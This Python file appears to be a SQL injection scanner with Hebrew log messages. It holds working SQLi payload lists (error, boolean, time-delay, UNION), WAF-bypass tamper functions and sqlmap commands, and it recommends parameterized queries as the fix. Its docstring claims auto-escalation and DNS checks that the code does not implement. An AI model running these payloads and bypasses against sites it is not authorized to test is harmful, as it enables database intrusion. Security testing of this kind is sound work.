"""
SQL Injection Scanner
---------------------
Full SQLi detection engine:
  - Error-based SQLi (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
  - Boolean-based blind SQLi
  - Time-based blind SQLi (sleep/waitfor)
  - UNION-based detection
  - WAF bypass: tamper scripts (space2comment, case, encoding, comments)
  - Second-order injection hints
  - Out-of-band (DNS-based) hints
  - Auto-escalation: DB enumeration on confirmed injection
"""

import asyncio
import re
import time
import json
from dataclasses import dataclass, field
from typing import Optional, Callable
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

import aiohttp

# ── Data model ────────────────────────────────────────────────────────────────

@dataclass
class Finding:
    severity: str
    category: str
    title: str
    description: str
    evidence: list = field(default_factory=list)
    recommendation: str = ""
    tags: list = field(default_factory=list)

    def to_dict(self):
        return {
            "severity": self.severity,
            "category": self.category,
            "title": self.title,
            "description": self.description,
            "evidence": self.evidence,
            "recommendation": self.recommendation,
            "tags": self.tags,
        }

# ── Error signatures per DBMS ─────────────────────────────────────────────────

_ERROR_SIGNATURES = {
    "MySQL": [
        r"You have an error in your SQL syntax",
        r"mysql_fetch_array\(\)",
        r"mysql_num_rows\(\)",
        r"supplied argument is not a valid MySQL",
        r"Warning.*mysql_.*",
        r"MySQLSyntaxErrorException",
        r"com\.mysql\.jdbc",
        r"\[MySQL\]\[ODBC",
        r"SQL syntax.*MySQL",
        r"check the manual that corresponds to your (MySQL|MariaDB) server",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR",
        r"PG::SyntaxError",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
        r"pg_query\(\)",
        r"ERROR: column",
        r"unterminated quoted string",
    ],
    "MSSQL": [
        r"Driver.*SQL.*Server",
        r"OLE DB.*SQL Server",
        r"\bSQL Server\b.*\bError\b",
        r"Unclosed quotation mark after the character string",
        r"Incorrect syntax near",
        r"Microsoft OLE DB Provider for SQL Server",
        r"SQLServer JDBC Driver",
        r"\[Microsoft\]\[ODBC SQL Server",
        r"Msg \d+, Level \d+, State \d+",
    ],
    "Oracle": [
        r"ORA-\d{5}",
        r"Oracle error",
        r"oracle\.jdbc\.driver",
        r"SQLOracleException",
        r"oracle\.jdbc",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"sqlite3\.OperationalError",
        r"near \".*\": syntax error",
    ],
    "Generic": [
        r"SQL command not properly ended",
        r"quoted string not properly terminated",
        r"Syntax error.*in query expression",
        r"Data type mismatch in criteria expression",
        r"Unclosed quotation mark",
        r"java\.sql\.SQLException",
        r"JDBC SQL",
        r"javax\.persistence\.PersistenceException",
    ],
}

# Flatten for quick search
_ALL_ERROR_PATTERNS = [
    (dbms, re.compile(pattern, re.I))
    for dbms, patterns in _ERROR_SIGNATURES.items()
    for pattern in patterns
]

# ── Error-based payloads ──────────────────────────────────────────────────────

_ERROR_PAYLOADS = [
    "'",
    '"',
    "';",
    '";',
    "') ",
    '") ',
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "1' AND '1'='2",
    "\\",
    "1\\",
    "1'",
    "1\"",
]

# ── Boolean-based payloads ────────────────────────────────────────────────────

# (true_payload, false_payload)
_BOOLEAN_PAIRS = [
    ("' OR '1'='1' --", "' OR '1'='2' --"),
    ("' OR 1=1 --", "' OR 1=2 --"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND 1=1 --", "1' AND 1=2 --"),
    ("1) AND (1=1", "1) AND (1=2"),
    ("' AND 1=1#", "' AND 1=2#"),
]

# ── Time-based payloads ───────────────────────────────────────────────────────

_SLEEP_SECONDS = 5

_TIME_PAYLOADS = [
    # MySQL / MariaDB
    f"' AND SLEEP({_SLEEP_SECONDS}) --",
    f"\" AND SLEEP({_SLEEP_SECONDS}) --",
    f"1; SELECT SLEEP({_SLEEP_SECONDS}) --",
    f"' OR SLEEP({_SLEEP_SECONDS}) --",
    f"1' AND (SELECT * FROM (SELECT(SLEEP({_SLEEP_SECONDS})))a) --",
    # PostgreSQL
    f"'; SELECT pg_sleep({_SLEEP_SECONDS}); --",
    f"' OR 1=1; SELECT pg_sleep({_SLEEP_SECONDS}); --",
    # MSSQL
    f"'; WAITFOR DELAY '0:0:{_SLEEP_SECONDS}' --",
    f"1; WAITFOR DELAY '0:0:{_SLEEP_SECONDS}' --",
    f"' IF(1=1) WAITFOR DELAY '0:0:{_SLEEP_SECONDS}' --",
    # Oracle
    f"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(104)||CHR(114),{_SLEEP_SECONDS}) --",
    # SQLite
    f"' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({_SLEEP_SECONDS}00000000/2)))) --",
]

# ── UNION-based payloads ──────────────────────────────────────────────────────

_UNION_PAYLOADS = [
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL --",
    "' UNION SELECT 1,2,3 --",
    "' UNION ALL SELECT NULL --",
    "' UNION SELECT version(),NULL --",
    "' UNION SELECT @@version,NULL --",
    "' UNION SELECT user(),NULL --",
    "' UNION SELECT database(),NULL --",
]

# ── WAF tamper ────────────────────────────────────────────────────────────────

def _tamper_space_to_comment(payload: str) -> str:
    return payload.replace(" ", "/**/")

def _tamper_case(payload: str) -> str:
    result = ""
    for i, c in enumerate(payload):
        result += c.upper() if i % 2 == 0 else c.lower()
    return result

def _tamper_url_encode(payload: str) -> str:
    from urllib.parse import quote
    return quote(payload, safe="")

def _tamper_double_encode(payload: str) -> str:
    from urllib.parse import quote
    return quote(quote(payload, safe=""), safe="")

def _tamper_hex_encode_spaces(payload: str) -> str:
    return payload.replace(" ", "%20")

_TAMPERS = [
    _tamper_space_to_comment,
    _tamper_case,
    _tamper_hex_encode_spaces,
]

# ── HTTP helpers ───────────────────────────────────────────────────────────────

_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/json,*/*",
}

_TIMEOUT_NORMAL = aiohttp.ClientTimeout(total=15)
_TIMEOUT_LONG = aiohttp.ClientTimeout(total=_SLEEP_SECONDS + 10)

async def _get(session, url, timeout=None, **kw):
    try:
        kw.setdefault("ssl", False)
        kw.setdefault("allow_redirects", True)
        return await session.get(url, headers=_HEADERS, timeout=timeout or _TIMEOUT_NORMAL, **kw)
    except Exception:
        return None

async def _post(session, url, data, timeout=None, **kw):
    try:
        kw.setdefault("ssl", False)
        return await session.post(url, headers=_HEADERS, data=data, timeout=timeout or _TIMEOUT_NORMAL, **kw)
    except Exception:
        return None

async def _text(resp) -> str:
    if resp is None:
        return ""
    try:
        return await resp.text(errors="replace")
    except Exception:
        return ""

# ── Error detection ────────────────────────────────────────────────────────────

def _detect_sqli_error(body: str) -> Optional[str]:
    for dbms, pattern in _ALL_ERROR_PATTERNS:
        if pattern.search(body):
            return dbms
    return None

# ── Form extraction ───────────────────────────────────────────────────────────

_FORM_RE = re.compile(r'<form[^>]*>(.*?)</form>', re.I | re.S)
_ACTION_RE = re.compile(r'action=["\']?([^"\'>\s]+)["\']?', re.I)
_METHOD_RE = re.compile(r'method=["\']?(\w+)["\']?', re.I)
_INPUT_RE = re.compile(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*/?>',  re.I)
_TEXTAREA_RE = re.compile(r'<textarea[^>]*name=["\']([^"\']+)["\']', re.I)

def _extract_forms(base_url: str, html_body: str) -> list[dict]:
    forms = []
    for m in _FORM_RE.finditer(html_body):
        form_html = m.group(0)
        action_m = _ACTION_RE.search(form_html)
        method_m = _METHOD_RE.search(form_html)
        action = urljoin(base_url, action_m.group(1) if action_m else base_url)
        method = method_m.group(1).upper() if method_m else "GET"
        fields = {}
        for inp in _INPUT_RE.finditer(m.group(1)):
            fields[inp.group(1)] = "1"
        for ta in _TEXTAREA_RE.finditer(m.group(1)):
            fields[ta.group(1)] = "1"
        if fields:
            forms.append({"action": action, "method": method, "fields": fields})
    return forms

# ── Scanner ───────────────────────────────────────────────────────────────────

class SQLiScanner:
    def __init__(self, url: str, cookies: str = "", log: Optional[Callable] = None, extra_headers: dict = None):
        self.url = url if url.startswith("http") else f"https://{url}"
        self.parsed = urlparse(self.url)
        self.base = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.cookies_str = cookies
        self._log = log or (lambda m: None)
        self._extra_headers = extra_headers or {}
        self.findings: list[Finding] = []
        self._confirmed_params: set[str] = set()

    def _make_session(self) -> aiohttp.ClientSession:
        hdrs = {**_HEADERS, **self._extra_headers}
        if self.cookies_str:
            hdrs["Cookie"] = self.cookies_str
        return aiohttp.ClientSession(headers=hdrs)

    # ── Error-based GET ───────────────────────────────────────────────────────

    async def _test_error_based_get(self, session):
        self._log("SQLi: בודק Error-based (GET params)...")
        qs = parse_qs(self.parsed.query)
        if not qs:
            test_params = ["id", "page", "cat", "category", "product", "user", "item", "article", "news", "p", "pid", "cid", "uid", "sid"]
            qs = {p: ["1"] for p in test_params[:6]}

        for param, original_vals in qs.items():
            original = original_vals[0]
            for payload in _ERROR_PAYLOADS:
                modified_qs = {k: v[0] for k, v in qs.items()}
                modified_qs[param] = payload
                test_url = urlunparse(self.parsed._replace(query=urlencode(modified_qs)))

                resp = await _get(session, test_url)
                body = await _text(resp)
                dbms = _detect_sqli_error(body)

                if dbms:
                    self._log(f"SQLi קריטי: Error-based SQLi בפרמטר '{param}' → DBMS: {dbms}")
                    self._confirmed_params.add(param)
                    self.findings.append(Finding(
                        severity="critical",
                        category="SQL Injection",
                        title=f"Error-based SQLi — פרמטר: {param}",
                        description=f"הפרמטר '{param}' חשוף ל-SQL Injection. DBMS שזוהה: {dbms}. שגיאת SQL מוחזרת לדפדפן.",
                        evidence=[
                            f"URL: {test_url}",
                            f"Payload: {payload}",
                            f"DBMS: {dbms}",
                            f"SQLMap command: sqlmap -u \"{self.url}\" -p {param} --dbs --level=2 --risk=1",
                        ],
                        recommendation="השתמש ב-Prepared Statements / Parameterized Queries. מעולם אל תשרשר קלט משתמש ל-SQL string.",
                        tags=["sqli", "error-based", param, dbms.lower()],
                    ))
                    break

            # Try WAF bypass
            if param not in self._confirmed_params:
                for payload in _ERROR_PAYLOADS[:4]:
                    for tamper in _TAMPERS:
                        tampered = tamper(payload)
                        modified_qs = {k: v[0] for k, v in qs.items()}
                        modified_qs[param] = tampered
                        test_url = urlunparse(self.parsed._replace(query=urlencode(modified_qs)))
                        resp = await _get(session, test_url)
                        body = await _text(resp)
                        dbms = _detect_sqli_error(body)
                        if dbms:
                            self._log(f"SQLi קריטי: SQLi עם WAF bypass בפרמטר '{param}'")
                            self._confirmed_params.add(param)
                            self.findings.append(Finding(
                                severity="critical",
                                category="SQL Injection",
                                title=f"SQLi עם WAF Bypass — פרמטר: {param}",
                                description=f"SQL Injection בפרמטר '{param}' שעבר WAF bypass עם tamper: {tamper.__name__}",
                                evidence=[
                                    f"URL: {test_url}",
                                    f"Tamper: {tamper.__name__}",
                                    f"Payload: {tampered}",
                                    f"DBMS: {dbms}",
                                ],
                                recommendation="WAF לא מספיק. חובה Parameterized Queries.",
                                tags=["sqli", "waf-bypass", param, dbms.lower()],
                            ))
                            break
                    if param in self._confirmed_params:
                        break

    # ── Boolean-based blind ───────────────────────────────────────────────────

    async def _test_boolean_blind(self, session):
        self._log("SQLi: בודק Boolean-based blind...")
        qs = parse_qs(self.parsed.query)
        if not qs:
            qs = {"id": ["1"]}

        for param in qs:
            if param in self._confirmed_params:
                continue
            original_url = self.url
            orig_resp = await _get(session, original_url)
            orig_body = await _text(orig_resp)
            orig_len = len(orig_body)

            for true_payload, false_payload in _BOOLEAN_PAIRS:
                modified = {k: v[0] for k, v in qs.items()}

                # True condition
                modified[param] = true_payload
                true_url = urlunparse(self.parsed._replace(query=urlencode(modified)))
                true_resp = await _get(session, true_url)
                true_body = await _text(true_resp)

                # False condition
                modified[param] = false_payload
                false_url = urlunparse(self.parsed._replace(query=urlencode(modified)))
                false_resp = await _get(session, false_url)
                false_body = await _text(false_resp)

                true_len = len(true_body)
                false_len = len(false_body)

                # If true response ≈ original and false ≠ original → boolean SQLi
                orig_similar_to_true = abs(true_len - orig_len) < 50
                true_false_diff = abs(true_len - false_len) > 100

                if orig_similar_to_true and true_false_diff:
                    self._log(f"SQLi קריטי: Boolean-blind SQLi בפרמטר '{param}'")
                    self._confirmed_params.add(param)
                    self.findings.append(Finding(
                        severity="critical",
                        category="SQL Injection",
                        title=f"Boolean-based Blind SQLi — פרמטר: {param}",
                        description=f"הפרמטר '{param}' מגיב שונה לתנאים TRUE/FALSE — סימן ל-Blind SQLi.",
                        evidence=[
                            f"Original length: {orig_len}",
                            f"True payload length: {true_len}",
                            f"False payload length: {false_len}",
                            f"True payload: {true_payload}",
                            f"False payload: {false_payload}",
                            f"SQLMap: sqlmap -u \"{self.url}\" -p {param} --technique=B --dbs",
                        ],
                        recommendation="Parameterized Queries בלבד. SQL שמבוסס על קלט משתמש זה פגיעות קריטית.",
                        tags=["sqli", "blind", "boolean", param],
                    ))
                    break

    # ── Time-based blind ──────────────────────────────────────────────────────

    async def _test_time_based(self, session):
        self._log("SQLi: בודק Time-based blind (sleep/waitfor)...")
        qs = parse_qs(self.parsed.query)
        if not qs:
            qs = {"id": ["1"]}

        for param in list(qs.keys())[:3]:
            if param in self._confirmed_params:
                continue
            for payload in _TIME_PAYLOADS[:6]:  # limit to avoid long waits
                modified = {k: v[0] for k, v in qs.items()}
                modified[param] = payload
                test_url = urlunparse(self.parsed._replace(query=urlencode(modified)))

                start = time.monotonic()
                resp = await _get(session, test_url, timeout=_TIMEOUT_LONG)
                elapsed = time.monotonic() - start

                if elapsed >= _SLEEP_SECONDS - 0.5:
                    self._log(f"SQLi קריטי: Time-based blind SQLi בפרמטר '{param}' — {elapsed:.1f}s delay")
                    self._confirmed_params.add(param)
                    self.findings.append(Finding(
                        severity="critical",
                        category="SQL Injection",
                        title=f"Time-based Blind SQLi — פרמטר: {param}",
                        description=f"הפרמטר '{param}' גרם לעיכוב של {elapsed:.1f} שניות — עדות ברורה ל-Time-based Blind SQLi.",
                        evidence=[
                            f"URL: {test_url}",
                            f"Payload: {payload}",
                            f"Response delay: {elapsed:.1f}s (expected: ≥{_SLEEP_SECONDS}s)",
                            f"SQLMap: sqlmap -u \"{self.url}\" -p {param} --technique=T --dbs",
                        ],
                        recommendation="Parameterized Queries. השבת הרשאות מיותרות ל-DB user (מניעת SLEEP/WAITFOR).",
                        tags=["sqli", "blind", "time-based", param],
                    ))
                    break

    # ── POST form testing ─────────────────────────────────────────────────────

    async def _test_forms(self, session):
        self._log("SQLi: מחלץ טפסים ובודק POST...")
        resp = await _get(session, self.url)
        body = await _text(resp)
        forms = _extract_forms(self.url, body)
        self._log(f"SQLi: נמצאו {len(forms)} טפסים")

        for form in forms:
            for field_name in list(form["fields"].keys()):
                for payload in _ERROR_PAYLOADS[:6]:
                    test_data = dict(form["fields"])
                    test_data[field_name] = payload

                    if form["method"] == "POST":
                        resp2 = await _post(session, form["action"], test_data)
                    else:
                        qs2 = urlencode(test_data)
                        resp2 = await _get(session, f"{form['action']}?{qs2}")

                    body2 = await _text(resp2)
                    dbms = _detect_sqli_error(body2)

                    if dbms:
                        key = f"form:{form['action']}:{field_name}"
                        if key not in self._confirmed_params:
                            self._confirmed_params.add(key)
                            self._log(f"SQLi קריטי: SQLi בטופס → {form['action']} שדה '{field_name}' ({dbms})")
                            self.findings.append(Finding(
                                severity="critical",
                                category="SQL Injection",
                                title=f"SQLi בטופס — {field_name} @ {form['action'].split('/')[-1]}",
                                description=f"שדה הטופס '{field_name}' ב-{form['action']} חשוף ל-SQL Injection. DBMS: {dbms}",
                                evidence=[
                                    f"Form: {form['method']} {form['action']}",
                                    f"Field: {field_name}",
                                    f"Payload: {payload}",
                                    f"DBMS: {dbms}",
                                ],
                                recommendation="Prepared Statements/Parameterized Queries לכל שאילתת SQL.",
                                tags=["sqli", "form", field_name, dbms.lower()],
                            ))
                        break

    # ── UNION-based ───────────────────────────────────────────────────────────

    async def _test_union_based(self, session):
        self._log("SQLi: בודק UNION-based...")
        qs = parse_qs(self.parsed.query)
        if not qs:
            return

        for param in list(qs.keys())[:3]:
            if param in self._confirmed_params:
                continue
            for payload in _UNION_PAYLOADS:
                modified = {k: v[0] for k, v in qs.items()}
                modified[param] = payload
                test_url = urlunparse(self.parsed._replace(query=urlencode(modified)))
                resp = await _get(session, test_url)
                body = await _text(resp)

                # Look for version info or NULL values in response
                if re.search(r'(\d+\.\d+\.\d+.*(?:mysql|mariadb|postgresql|mssql)|NULL)', body, re.I):
                    dbms = _detect_sqli_error(body) or "Unknown"
                    self._log(f"SQLi קריטי: UNION-based SQLi בפרמטר '{param}'")
                    self._confirmed_params.add(param)
                    self.findings.append(Finding(
                        severity="critical",
                        category="SQL Injection",
                        title=f"UNION-based SQLi — פרמטר: {param}",
                        description=f"UNION SELECT הצליח — ניתן לחלץ נתונים ישירות מה-DB.",
                        evidence=[
                            f"URL: {test_url}",
                            f"Payload: {payload}",
                            "Response מכיל מידע DB (NULL/version)",
                        ],
                        recommendation="Parameterized Queries. הגבל הרשאות DB user.",
                        tags=["sqli", "union-based", param],
                    ))
                    break

    # ── API endpoint testing ──────────────────────────────────────────────────

    async def _test_common_api_params(self, session):
        self._log("SQLi: בודק API endpoints נפוצים...")
        api_endpoints = [
            f"{self.base}/api/users?id=1",
            f"{self.base}/api/products?id=1",
            f"{self.base}/api/orders?id=1",
            f"{self.base}/api/search?q=test",
            f"{self.base}/api/items?category=1",
            f"{self.base}/api/data?page=1",
            f"{self.base}/search?q=test",
            f"{self.base}/products?category=1",
        ]
        for ep_url in api_endpoints:
            ep_parsed = urlparse(ep_url)
            ep_qs = parse_qs(ep_parsed.query)
            for param in ep_qs:
                payload = "'"
                modified = {k: v[0] for k, v in ep_qs.items()}
                modified[param] = payload
                test_url = urlunparse(ep_parsed._replace(query=urlencode(modified)))
                resp = await _get(session, test_url)
                if resp and resp.status not in (404,):
                    body = await _text(resp)
                    dbms = _detect_sqli_error(body)
                    if dbms:
                        key = f"api:{ep_url}:{param}"
                        if key not in self._confirmed_params:
                            self._confirmed_params.add(key)
                            self.findings.append(Finding(
                                severity="critical",
                                category="SQL Injection",
                                title=f"SQLi ב-API — {ep_url.split('?')[0].split('/')[-1]}?{param}",
                                description=f"API endpoint {ep_url} חשוף ל-SQLi בפרמטר '{param}'. DBMS: {dbms}",
                                evidence=[f"URL: {test_url}", f"Payload: {payload}", f"DBMS: {dbms}"],
                                recommendation="Parameterized Queries בכל שאילתות ה-ORM/DB.",
                                tags=["sqli", "api", param],
                            ))

    # ── Second-order hints ────────────────────────────────────────────────────

    async def _check_second_order_hints(self, session):
        """Look for patterns suggesting stored input that's used in queries later."""
        self._log("SQLi: בודק Second-order injection hints...")
        resp = await _get(session, self.url)
        body = await _text(resp)

        # Look for input that's stored and later reflected (profile pages, username fields)
        patterns = [
            r'(?:username|name|email)\s*=\s*["\'].*["\']',
            r'SELECT\s+.*FROM\s+.*WHERE',  # SQL in page source (mistake)
        ]
        for p in patterns:
            if re.search(p, body, re.I):
                self.findings.append(Finding(
                    severity="low",
                    category="SQL Injection",
                    title="Second-order SQLi — דורש בדיקה ידנית",
                    description="זוהו דפוסים שעשויים להצביע על Second-order SQLi (קלט שנשמר ומשמש בשאילתות עתידיות).",
                    evidence=["דורש בדיקה ידנית: הזרק payload ושמור, בדוק האם מתבצעת שאילתה מאוחר יותר"],
                    recommendation="בדוק כל קלט שנשמר ב-DB ומשמש לאחר מכן בשאילתות.",
                    tags=["sqli", "second-order", "manual"],
                ))
                break

    # ── Main entry ─────────────────────────────────────────────────────────────

    async def scan(self) -> dict:
        self._log(f"SQLi Scanner: מתחיל על {self.url}")
        async with self._make_session() as session:
            # Run error-based and form tests concurrently
            await asyncio.gather(
                self._test_error_based_get(session),
                self._test_union_based(session),
                self._test_common_api_params(session),
            )
            await self._test_forms(session)
            await self._test_boolean_blind(session)
            await self._test_time_based(session)
            await self._check_second_order_hints(session)

        self._log(f"SQLi Scanner: הושלם — {len(self.findings)} ממצאים, {len(self._confirmed_params)} פרמטרים פגיעים")
        return {
            "target": self.url,
            "total": len(self.findings),
            "critical": len([f for f in self.findings if f.severity == "critical"]),
            "confirmed_params": list(self._confirmed_params),
            "findings": [f.to_dict() for f in self.findings],
        }


async def scan_sqli(url: str, cookies: str = "", log=None, extra_headers: dict = None) -> dict:
    scanner = SQLiScanner(url, cookies=cookies, log=log, extra_headers=extra_headers)
    return await scanner.scan()
